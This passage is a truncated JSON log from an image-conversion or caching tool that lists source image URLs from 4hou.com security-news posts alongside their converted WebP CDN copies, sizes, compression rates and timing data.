KB","compressRate":"84.1%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074498520844.png","sourceStatusCode":200,"destWidth":377,"destHeight":68,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn63@2020_5/2020/09/05/07-31-00-353_49e553efb44b0760.webp","sourceBytes":1743,"destBytes":2800,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4804,"convertSpendMs":4,"createdTime":"2020-09-05 15:30:56","host":"us-51*","referer":"https://www.4hou.com/posts/mG90","linkMd5ListStr":"7c030266888b48c212298d4439949659,7c030266888b48c212298d4439949659","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"1.7 KB","destSize":"2.7 KB","compressRate":"160.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200901/1598949779183647.png","sourceStatusCode":200,"destWidth":728,"destHeight":380,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn43@2020_2/2020/09/05/07-31-00-505_91ace699ff81f3ba.webp","sourceBytes":55594,"destBytes":29656,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5057,"convertSpendMs":12,"createdTime":"2020-09-05 15:30:56","host":"us-037*","referer":"https://www.4hou.com/posts/Npoz","linkMd5ListStr":"1b46b90ee5cb7d23c3202e2b104ab1b8,1b46b90ee5cb7d23c3202e2b104ab1b8","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"54.3 KB","destSize":"29 KB","compressRate":"53.3%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200525/1590368411143749.jpg","sourceStatusCode":200,"destWidth":500,"destHeight":375,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn76@2020_1/2020/09/05/07-31-00-563_88f2917de2178d12.webp","sourceBytes":31911,"destBytes":31000,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5135,"convertSpendMs":17,"createdTime":"2020-09-05 15:30:56","host":"us-004*","referer":"https://www.4hou.com/posts/lD27","linkMd5ListStr":"08fb58d49a8102ed244e7c3d2ac25e2d,08fb58d49a8102ed244e7c3d2ac25e2d","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"31.2 KB","destSize":"30.3 KB","compressRate":"97.1%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598324142152039.png","sourceStatusCode":200,"destWidth":226,"destHeight":324,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn80@2020_4/2020/09/05/07-31-00-307_ee37d5eed488b9e0.webp","sourceBytes":4829,"destBytes":14148,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5283,"convertSpendMs":6,"createdTime":"2020-09-05 15:30:56","host":"europe67*","referer":"https://www.4hou.com/posts/DPVn","linkMd5ListStr":"e2801c0105fa9272b5c2785b034eaec8,e2801c0105fa9272b5c2785b034eaec8","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"4.7 KB","destSize":"13.8 KB","compressRate":"293%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599209227818505.png","sourceStatusCode":200,"destWidth":828,"destHeight":474,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn24@2020_1/2020/09/05/07-31-01-115_f6595ca16f2bb883.webp","sourceBytes":465273,"destBytes":43986,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5754,"convertSpendMs":32,"createdTime":"2020-09-05 15:30:56","host":"us-033*","referer":"https://www.4hou.com/posts/p7D1","linkMd5ListStr":"6a3fdadb7cf1c2c2b8d99f7e0c628dc5,6a3fdadb7cf1c2c2b8d99f7e0c628dc5","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"454.4 KB","destSize":"43 KB","compressRate":"9.5%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599207440145763.png","sourceStatusCode":200,"destWidth":722,"destHeight":480,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn28@2020_5/2020/09/05/07-31-03-369_094c6d9d853ea88e.webp","sourceBytes":614280,"destBytes":65710,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":7975,"convertSpendMs":29,"createdTime":"2020-09-05 15:30:56","host":"us-021*","referer":"https://www.4hou.com/posts/o7Bz","linkMd5ListStr":"4f78d6861e72f68e32f7db818d64cf27,4f78d6861e72f68e32f7db818d64cf27","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"599.9 KB","destSize":"64.2 KB","compressRate":"10.7%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599191165142040.jpeg","sourceStatusCode":200,"destWidth":1080,"destHeight":1462,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn40@2020_3/2020/09/05/07-31-02-864_bc06172dbe5b7162.webp","sourceBytes":114396,"destBytes":79712,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":7891,"convertSpendMs":60,"createdTime":"2020-09-05 15:30:56","host":"europe-59*","referer":"https://www.4hou.com/posts/wZNw","linkMd5ListStr":"b6031335b5a855e88d6461fc3df32e2f,b6031335b5a855e88d6461fc3df32e2f","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"111.7 KB","destSize":"77.8 KB","compressRate":"69.7%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599133209630949.png","sourceStatusCode":200,"destWidth":1107,"destHeight":217,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn31@2020_1/2020/09/05/07-31-04-456_e165eb51654a5a19.webp","sourceBytes":76445,"destBytes":28468,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":9145,"convertSpendMs":18,"createdTime":"2020-09-05 15:30:56","host":"us-008*","referer":"https://www.4hou.com/posts/jLw5","linkMd5ListStr":"5a8d9baa3fcf5964289fd4c120fda57b,5a8d9baa3fcf5964289fd4c120fda57b","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"74.7 KB","destSize":"27.8 KB","compressRate":"37.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239246200041.jpeg","sourceStatusCode":200,"destWidth":1024,"destHeight":475,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn83@2020_3/2020/09/05/07-31-05-395_e38a79186fbfc507.webp","sourceBytes":188340,"destBytes":204136,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":10169,"convertSpendMs":38,"createdTime":"2020-09-05 15:30:56","host":"us-032*","referer":"https://www.4hou.com/posts/o7gK","linkMd5ListStr":"ddc5f53c84d25939a386e5b2bb709c67,ddc5f53c84d25939a386e5b2bb709c67","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"183.9 KB","destSize":"199.4 KB","compressRate":"108.4%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200902/1599038928102163.png","sourceStatusCode":200,"destWidth":1005,"destHeight":562,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn51@2020_1/2020/09/05/07-31-05-705_f400401f99dc795e.webp","sourceBytes":49075,"destBytes":61418,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":10303,"convertSpendMs":43,"createdTime":"2020-09-05 15:30:56","host":"us-012*","referer":"https://www.4hou.com/posts/53vR","linkMd5ListStr":"2184c32448c38dcf20754011036d1b8a,2184c32448c38dcf20754011036d1b8a","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"47.9 KB","destSize":"60 KB","compressRate":"125.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239922418869.jpeg","sourceStatusCode":200,"destWidth":1024,"destHeight":475,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn56@2020_1/2020/09/05/07-31-08-978_4f042b346849e277.webp","sourceBytes":188340,"destBytes":204136,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":14523,"convertSpendMs":49,"createdTime":"2020-09-05 15:30:56","host":"europe-25*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c,8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"183.9 KB","destSize":"199.4 KB","compressRate":"108.4%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200831/1598861336696337.png","sourceStatusCode":200,"destWidth":665,"destHeight":327,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn72@2020_1/2020/09/05/07-31-14-040_7df9428037122aae.webp","sourceBytes":33446,"destBytes":18390,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":18711,"convertSpendMs":29,"createdTime":"2020-09-05 15:30:56","host":"us-017*","referer":"https://www.4hou.com/posts/rXW6","linkMd5ListStr":"172e18230e5902bab7e2e0aa682bcb05,172e18230e5902bab7e2e0aa682bcb05","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"32.7 KB","destSize":"18 KB","compressRate":"55%"},{"code":1,"isDone":false,"source":"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579191075147-WYIB5NUVO6YHAOW6YA86/ke17ZwdGBToddI8pDm48kBZ7TSA-OIHIMgNUW3PhN0UUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKc__cYxNkZ9ENOO4OE3kD_Y7ZnqXUYsnMuOC9JBBnWpP9VlWo1ts9fs6mkZXFLIxF6/Picture3.png?format=1000w","sourceStatusCode":200,"destWidth":1000,"destHeight":280,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn14@2020_4/2020/09/05/07-31-15-154_0516796452a557c3.webp","sourceBytes":149869,"destBytes":35114,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":952,"convertSpendMs":18,"createdTime":"2020-09-05 15:31:15","host":"us-033*","referer":"https://www.4hou.com/posts/N5lD","linkMd5ListStr":"072eb2032d7770811393baa5bd62da28","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"146.4 KB","destSize":"34.3 KB","compressRate":"23.4%"},{"code":1,"isDone":false,"source":"https://pic.36krcnd.com/202009/03020337/7h99393l0329sq5g","sourceStatusCode":200,"destWidth":571,"destHeight":335,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn34@2020_2/2020/09/05/07-31-16-121_67c659c62af7d472.webp","sourceBytes":27269,"destBytes":22020,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2171,"convertSpendMs":29,"createdTime":"2020-09-05 15:31:15","host":"europe-60*","referer":"https://www.4hou.com/posts/62w9","linkMd5ListStr":"d4990d794912cd0e310810f1323b377f","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"26.6 KB","destSize":"21.5 KB","compressRate":"80.8%"},{"code":1,"isDone":false,"source":"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579192143842-BTMDMH1PG9X5VCRK1IOL/ke17ZwdGBToddI8pDm48kLe6LWMlKBq-Vv2EhBmmYxhZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PITMwTbLtPUWqyaMkXQiLbKmDmKrh8WlGXRIFtElLe2T8/Picture8.png?format=1000w","sourceStatusCode":200,"destWidth":974,"destHeight":258,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn23@2020_5/2020/09/05/07-31-17-029_74a5365155f3739c.webp","sourceBytes":89486,"destBytes":40624,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":997,"convertSpendMs":21,"createdTime":"2020-09-05 15:31:16","host":"us-53*","referer":"https://www.4hou.com/posts/N5lD","linkMd5ListStr":"072eb2032d7770811393baa5bd62da28","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"87.4 KB","destSize":"39.7 KB","compressRate":"45.4%"},{"code":1,"isDone":false,"source":"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579191013284-XF6EEC322W9E5TPUGS6E/ke17ZwdGBToddI8pDm48kOuKQhATqZFNN3vX4_aPbztZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PI1S574DVO7IFsPUeqc-YKuBpb1LF01TSQHKWZqGa7C-8/Picture2.png?format=1000w","sourceStatusCode":200,"destWidth":929,"destHeight":675,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn91@2020_6/2020/09/05/07-31-16-830_63989643fcae901a.webp","sourceBytes":371240,"destBytes":130984,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1258,"convertSpendMs":45,"createdTime":"2020-09-05 15:31:16","host":"us-010*","referer":"https://www.4hou.com/posts/N5lD","linkMd5ListStr":"072eb2032d7770811393baa5bd62da28","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"362.5 KB","destSize":"127.9 KB","compressRate":"35.3%"},{"code":1,"isDone":false,"source":"https://thehackernews.com/images/-6zBRyYa11Gw/X1CpnSAYh6I/AAAAAAAAAuw/bUKB1SKpOOETuY4wX7TFZnaPOpGfM31tACLcBGAsYHQ/s728-e100/cisco-jabber-hacking.gif","sourceStatusCode":200,"destWidth":728,"destHeight":380,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn43@2020_3/2020/09/05/07-31-17-226_29a279832ee8e9de.webp","sourceBytes":45346,"destBytes":45346,"feedId":6942,"totalSpendMs":1290,"convertSpendMs":0,"createdTime":"2020-09-05 15:31:17","host":"europe-57*","referer":"https://www.4hou.com/posts/jLw5","linkMd5ListStr":"5a8d9baa3fcf5964289fd4c120fda57b","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"44.3 KB","destSize":"44.3 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101998107036.png","sourceStatusCode":200,"destWidth":776,"destHeight":160,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn45@2020_3/2020/09/05/07-31-18-018_eb5102593e03f847.webp","sourceBytes":9446,"destBytes":14278,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3839,"convertSpendMs":8,"createdTime":"2020-09-05 15:31:15","host":"us-013*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"9.2 KB","destSize":"13.9 KB","compressRate":"151.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239928104790.png","sourceStatusCode":200,"destWidth":1057,"destHeight":172,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn29@2020_6/2020/09/05/07-31-18-075_210953d8551ed3e1.webp","sourceBytes":61102,"destBytes":15470,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3979,"convertSpendMs":10,"createdTime":"2020-09-05 15:31:15","host":"europe-22*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"59.7 KB","destSize":"15.1 KB","compressRate":"25.3%"},{"code":1,"isDone":false,"source":"https://pic.36krcnd.com/202009/03020337/c1karuqzbavq3ibk","sourceStatusCode":200,"destWidth":1080,"destHeight":332,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn56@2020_3/2020/09/05/07-31-17-740_17078015c073258a.webp","sourceBytes":151602,"destBytes":40984,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2995,"convertSpendMs":19,"createdTime":"2020-09-05 15:31:16","host":"europe65*","referer":"https://www.4hou.com/posts/62w9","linkMd5ListStr":"d4990d794912cd0e310810f1323b377f","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"148 KB","destSize":"40 KB","compressRate":"27%"},{"code":1,"isDone":false,"source":"https://pic.36krcnd.com/202009/02013349/sl7mt8az6biva72j","sourceStatusCode":200,"destWidth":936,"destHeight":182,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn100@2020_6/2020/09/05/07-31-18-193_2fdaa967b4d39340.webp","sourceBytes":80786,"destBytes":19698,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2338,"convertSpendMs":16,"createdTime":"2020-09-05 15:31:16","host":"europe61*","referer":"https://www.4hou.com/posts/QvrY","linkMd5ListStr":"6065d354c99cc3ce6980c438cf2d40b5","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"78.9 KB","destSize":"19.2 KB","compressRate":"24.4%"},{"code":1,"isDone":false,"source":"https://pic.36krcnd.com/202009/02013349/o2gtl5anjct7lab9","sourceStatusCode":200,"destWidth":936,"destHeight":368,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn83@2020_1/2020/09/05/07-31-18-283_178c139312e4ddcf.webp","sourceBytes":31977,"destBytes":10994,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1186,"convertSpendMs":14,"createdTime":"2020-09-05 15:31:18","host":"europe65*","referer":"https://www.4hou.com/posts/QvrY","linkMd5ListStr":"6065d354c99cc3ce6980c438cf2d40b5","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"31.2 KB","destSize":"10.7 KB","compressRate":"34.4%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239250204956.jpeg","sourceStatusCode":200,"destWidth":1020,"destHeight":254,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn15@2020_4/2020/09/05/07-31-18-466_229297abcdd15769.webp","sourceBytes":43012,"destBytes":42354,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4332,"convertSpendMs":42,"createdTime":"2020-09-05 15:31:15","host":"us-034*","referer":"https://www.4hou.com/posts/o7gK","linkMd5ListStr":"ddc5f53c84d25939a386e5b2bb709c67","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"42 KB","destSize":"41.4 KB","compressRate":"98.5%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239936548484.png","sourceStatusCode":200,"destWidth":703,"destHeight":300,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn38@2020_3/2020/09/05/07-31-19-545_2539032e6ed1693d.webp","sourceBytes":6801,"destBytes":10242,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5287,"convertSpendMs":16,"createdTime":"2020-09-05 15:31:15","host":"us-038*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"6.6 KB","destSize":"10 KB","compressRate":"150.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200902/1599038929117765.png","sourceStatusCode":200,"destWidth":678,"destHeight":370,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn95@2020_4/2020/09/05/07-31-19-291_ba44d9bbf1265e90.webp","sourceBytes":9553,"destBytes":25920,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3728,"convertSpendMs":15,"createdTime":"2020-09-05 15:31:16","host":"europe-23*","referer":"https://www.4hou.com/posts/53vR","linkMd5ListStr":"2184c32448c38dcf20754011036d1b8a","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"9.3 KB","destSize":"25.3 KB","compressRate":"271.3%"},{"code":1,"isDone":false,"source":"https://thehackernews.com/images/-7-WFiNuCf2c/X1CqF26fZYI/AAAAAAAAAu4/n_YYDP5tXLwjE3phFiKjRtgZ_FGLQyw1ACLcBGAsYHQ/s728-e100/hacking-cisco.jpg","sourceStatusCode":200,"destWidth":728,"destHeight":375,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn56@2020_3/2020/09/05/07-31-19-165_ae35e8ca92c82e22.webp","sourceBytes":81066,"destBytes":49932,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1650,"convertSpendMs":18,"createdTime":"2020-09-05 15:31:19","host":"europe-59*","referer":"https://www.4hou.com/posts/jLw5","linkMd5ListStr":"5a8d9baa3fcf5964289fd4c120fda57b","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"79.2 KB","destSize":"48.8 KB","compressRate":"61.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239935230091.png","sourceStatusCode":200,"destWidth":1143,"destHeight":328,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn50@2020_1/2020/09/05/07-31-19-897_376a7ebc152c1393.webp","sourceBytes":158289,"destBytes":38246,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5721,"convertSpendMs":36,"createdTime":"2020-09-05 15:31:15","host":"us-001*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"154.6 KB","destSize":"37.3 KB","compressRate":"24.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200902/1599038928691632.png","sourceStatusCode":200,"destWidth":632,"destHeight":453,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn59@2020_5/2020/09/05/07-31-19-737_8e748f86aa7fb05c.webp","sourceBytes":51547,"destBytes":33224,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3660,"convertSpendMs":14,"createdTime":"2020-09-05 15:31:17","host":"europe-23*","referer":"https://www.4hou.com/posts/53vR","linkMd5ListStr":"2184c32448c38dcf20754011036d1b8a","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"50.3 KB","destSize":"32.4 KB","compressRate":"64.5%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200831/1598861365109265.png","sourceStatusCode":200,"destWidth":676,"destHeight":581,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn36@2020_4/2020/09/05/07-31-20-129_41d42fd7e82a1eb5.webp","sourceBytes":36240,"destBytes":27772,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4011,"convertSpendMs":19,"createdTime":"2020-09-05 15:31:16","host":"us-006*","referer":"https://www.4hou.com/posts/rXW6","linkMd5ListStr":"172e18230e5902bab7e2e0aa682bcb05","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"35.4 KB","destSize":"27.1 KB","compressRate":"76.6%"},{"code":1,"isDone":false,"source":"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579191747302-86WGHIMRQS5T8QEUW1BC/ke17ZwdGBToddI8pDm48kOW1m2A9RgiL1evLOUo_KzxZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIDTbr3xenHqqmZrzUqAWbUPp-iDaXpiN483MZT2XB6Ng/Picture6.png?format=1000w","sourceStatusCode":200,"destWidth":912,"destHeight":593,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn72@2020_2/2020/09/05/07-31-19-663_b90d759f20fb6594.webp","sourceBytes":299317,"destBytes":108642,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1661,"convertSpendMs":33,"createdTime":"2020-09-05 15:31:19","host":"europe-25*","referer":"https://www.4hou.com/posts/N5lD","linkMd5ListStr":"072eb2032d7770811393baa5bd62da28","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"292.3 KB","destSize":"106.1 KB","compressRate":"36.3%"},{"code":1,"isDone":false,"source":"https://pic.36krcnd.com/202009/02013349/t8uycj2uf0f1iugn","sourceStatusCode":200,"destWidth":936,"destHeight":120,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn89@2020_1/2020/09/05/07-31-20-332_7d8c5a96bd32f640.webp","sourceBytes":52274,"destBytes":15482,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2713,"convertSpendMs":11,"createdTime":"2020-09-05 15:31:18","host":"us-54*","referer":"https://www.4hou.com/posts/QvrY","linkMd5ListStr":"6065d354c99cc3ce6980c438cf2d40b5","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"51 KB","destSize":"15.1 KB","compressRate":"29.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101998162329.png","sourceStatusCode":200,"destWidth":687,"destHeight":378,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn28@2020_3/2020/09/05/07-31-20-321_2eba06e1b6a48d89.webp","sourceBytes":16553,"destBytes":30214,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4385,"convertSpendMs":13,"createdTime":"2020-09-05 15:31:16","host":"us-031*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"16.2 KB","destSize":"29.5 KB","compressRate":"182.5%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074498165746.png","sourceStatusCode":200,"destWidth":701,"destHeight":106,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn79@2020_5/2020/09/05/07-31-20-319_77dbad51816171c5.webp","sourceBytes":5580,"destBytes":12898,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4832,"convertSpendMs":6,"createdTime":"2020-09-05 15:31:16","host":"europe-57*","referer":"https://www.4hou.com/posts/mG90","linkMd5ListStr":"7c030266888b48c212298d4439949659","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"5.4 KB","destSize":"12.6 KB","compressRate":"231.1%"},{"code":1,"isDone":false,"source":"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579192091182-HMM8O7OWLTT0EJ0AJ9HW/ke17ZwdGBToddI8pDm48kD_UfJqkm-W-y3ys5mOSRWBZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PI6To6GQ7AoUn5hIP3N-jP5NwIjMB3Z-UmCNu49Cw3jsg/Picture7.png?format=1000w","sourceStatusCode":200,"destWidth":974,"destHeight":339,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn88@2020_4/2020/09/05/07-31-20-783_f5446210fc9c5e4c.webp","sourceBytes":67375,"destBytes":33186,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1035,"convertSpendMs":58,"createdTime":"2020-09-05 